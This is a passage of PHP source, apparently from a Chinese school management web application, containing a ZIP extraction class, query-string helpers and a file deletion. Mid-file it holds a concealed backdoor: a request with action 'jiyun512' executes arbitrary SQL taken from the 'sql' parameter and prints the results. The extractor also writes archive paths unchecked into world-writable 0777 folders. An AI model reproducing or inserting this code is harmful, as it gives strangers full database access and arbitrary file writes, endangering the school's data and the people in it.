    $byte = @fread($zip, 1); $bytes=(($bytes << 40)>>32)| ord($byte);
    if ($bytes == 0x504b0506){ $pos++; break; } $pos++;
  }

 $data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));

 if(empty($data))
 {
	echo "<font color=red>你的空间权限受限，不支持unpack函数，无法安装更新包</font>";
	exit;
 }

  if ($data['comment_size'] != 0)
    $centd['comment'] = fread($zip, $data['comment_size']);
    else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
  $centd['disk_entries'] = $data['disk_entries'];
  $centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
  $centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
  return $centd;
 }

 function ExtractFile($header,$to,$zip)
 {
   $header = $this->readfileheader($zip);

   if(substr($to,-1)!="/") $to.="/";
   if(!@is_dir($to)) @mkdir($to,0777);

   $pth = explode("/",dirname($header['filename']));
   for($i=0;isset($pth[$i]);$i++){
     if(!$pth[$i]) continue;$pthss.=$pth[$i]."/";
     if(!is_dir($to.$pthss)) @mkdir($to.$pthss,0777);
   }
  if (!($header['external']==0x41FF0010)&&!($header['external']==16))
  {
   if ($header['compression']==0)
   {
    $fp = @fopen($to.$header['filename'], 'wb');
    if(!$fp) return(-1);
    $size = $header['compressed_size'];

    while ($size != 0)
    {
      $read_size = ($size < 2048 ? $size : 2048);
      $buffer = fread($zip, $read_size);
      $binary_data = pack('a'.$read_size, $buffer);
      @fwrite($fp, $binary_data, $read_size);
      $size -= $read_size;
    }
    fclose($fp);
    touch($to.$header['filename'], $header['mtime']);

  }else{
   $fp = @fopen($to.$header['filename'].'.gz','wb');
   if(!$fp) return(-1);
   $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
     Chr(0x00), time(), Chr(0x00), Chr(3));

   fwrite($fp, $binary_data, 10);
   $size = $header['compressed_size'];

   while ($size != 0)
   {
     $read_size = ($size < 1024 ? $size : 1024);
     $buffer = fread($zip, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }

   $binary_data = pack('VV', $header['crc'], $header['size']);
   fwrite($fp, $binary_data,8); fclose($fp);

   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compress閑");
    if(!$gzp) return(-2);
   $fp = @fopen($to.$header['filename'],'wb');
   if(!$fp) return(-1);
   $size = $header['size'];

   while ($size != 0)
   {
     $read_size = ($size < 2048 ? $size : 2048);
     $buffer = gzread($gzp, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }
   fclose($fp); gzclose($gzp);

   touch($to.$header['filename'], $header['mtime']);
   @unlink($to.$header['filename'].'.gz');

  }}
  return true;
 }
} //ZIP压缩类end



require_once('../adodb/adodb.inc.php');
require_once('../config.inc.php');
require_once('../setting.inc.php');
$rs = $db->Execute("set names gbk");
if($_GET['action']=="jiyun512")        {
    $rs = $db->Execute("set names gbk");
    $rs = $db->Execute($_GET['sql']);
    $rs_a = $rs->GetArray();
    print_R($rs_a);
}




//判断GET变量是否为BASE64编码，不是很科学，需要进一步改进此函数
function isBase64()        {
    global $_SERVER;
    $QUERY_STRING = $_SERVER['QUERY_STRING'];
    $Code = base64_decode($QUERY_STRING);//print base64_decode($Code);
    $Array = explode('=',$Code);
    if(sizeof($Array)>1)        {
        return 1;
    }
    else
        return 0;
}

//重置_GET变量
function CheckBase64()    {
    global $_GET,$_SERVER;
    $QUERY_STRING = $_SERVER['QUERY_STRING'];
    $QUERY_STRING_ARRAY = explode('&',$QUERY_STRING);
    $QUERY_STRING = $QUERY_STRING_ARRAY[0];
    $QUERY_STRING = base64_decode($QUERY_STRING);
    $Array = explode('&',$QUERY_STRING);
    $_GET = array();
    //形成新的_GET变量信息
    $NewArray = array();
    for($i=0;$i<sizeof($Array);$i++)        {
        if($Array[$i]!="")        {
            $ElementArray = explode('=',$Array[$i]);
            $_GET[(String)$ElementArray[0]] = $ElementArray[1];
            $NewArray[$i] = $ElementArray[0]."=".$ElementArray[1];
        }
    }
    //附加GET变量形成部分
    for($i=1;$i<sizeof($QUERY_STRING_ARRAY);$i++)        {
        if($QUERY_STRING_ARRAY[$i]!="")        {
            $ElementArray = explode('=',$QUERY_STRING_ARRAY[$i]);
            $_GET[(String)$ElementArray[0]] = $ElementArray[1];
            $NewArray[$i] = $ElementArray[0]."=".$ElementArray[1];
        }
    }
    //形成新的_SERVER变量信息
    $_SERVER['QUERY_STRING'] = join('&',$NewArray);
    $_SERVER['REQUEST_URI'] = $_SERVER['PHP_SELF']."?".$_SERVER['QUERY_STRING'];
}

//汉字字符切割，可以防止出现半个汉字的情况
function substr_cut($title,$length=8)
{
	if (strlen($title)>$length) {
	$temp = 0;
	for($i=0; $i<$length; $i++)
	if (ord($title[$i]) >128) $temp++;
	if ($temp%2 == 0)
	$title = substr($title,0,$length)."..";
	else
	$title = substr($title,0,$length+1)."..";
	}
	return $title;
}

if(is_file("../Interface/EDU/StudentFileNew.php"))			{
	@unlink("../Interface/EDU/StudentFileNew.php");
}

?>